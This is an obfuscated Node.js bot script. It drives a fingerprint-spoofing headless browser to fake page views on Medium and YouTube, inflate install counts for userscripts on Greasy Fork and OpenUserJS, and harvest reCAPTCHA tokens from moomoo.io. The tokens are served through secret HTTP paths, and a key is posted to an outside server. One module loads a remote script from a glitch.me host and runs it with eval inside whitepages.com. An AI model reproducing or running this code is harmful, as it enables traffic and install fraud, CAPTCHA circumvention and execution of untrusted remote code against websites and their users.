      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + T(0x12) + V(0x0, '@j$H') + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + V(0x16, 'X*e2') + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + U(0x4) + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + V(0xc, 'IvHf') + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    V(0x10, '%l%1') + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + T(0xd) + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + T(0xb) + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + U(0x17),
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + U(0x13) + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x7 * -0x2a5 + -0x704 * 0x1 + 0x51b * 0x5
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const W = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x19c5 + -0x3 * 0x2c9 + -0x2 * 0x8b5)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + W(0xf)] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x95e * -0x1 + 0xeb5 + -0x4f3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1b5e + -0x10d4 + -0xa26), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1bf9 + 0xe8 + 0x1ce1 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xe6 * -0x28 + -0xffb + -0x13f5; w < getRandomInt(-0xafc + -0x3 * 0x79d + 0x21d4, 0xd * -0x107 + 0x88e + 0x4d2); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1be6 * -0xe + 0x3 * -0x44cb + 0x33f55);
        }
      }();
    }, -0xea0 + 0x22cd + -0x13c9), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1 * 0x2569 + -0xe99 * 0x2 + -0x429b * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1157 + 0x1 * -0x22ee + 0x1197, -0x1a54 + -0x239a + -0x470 * -0xe)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x25 * 0x1e3 + -0x1 * -0x96cf + 0x6 * 0x608);
    }, -0x1 * 0x2309 + 0x13 * -0x48 + 0x28c5), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x2 * 0x315 + -0x19df + 0x13b5;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x20b0 + 0x11a6 + 0x1ac2), await u['evaluate'](() => {
            const X = b;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + X(0x3, 'Yp0V') + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x21e + -0x5 * -0x473 + -0x1421), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x2c * -0x332b + 0xc6c7f * 0x2 + -0x251fa);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x8dd + 0x1796 + -0xe55);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const Y = d,
      i = url['parse'](f['url'])[Y(0x7)];
    h['writeHead'](0x1 * -0x5d9 + 0x2505 + -0x1e64);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h[Y(0x8)]('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x7b7 * -0x1 + 0x803 + 0xfd6);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const Z = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x17 * 0x77 + 0x232f + -0x2ddf) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x20ab * 0x1 + -0x6 * 0x255 + 0x2eaa));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1bfd + -0x2451 + 0x854, D['indexOf']('\x20'));
        return B ? E['slice'](-0x517 * 0x7 + 0x134 + 0x226d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2f77 + -0xa57 + 0x60de),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x24 * -0x196 + -0x5 * -0x2e + -0x12ee),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': Z(0x1a)
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
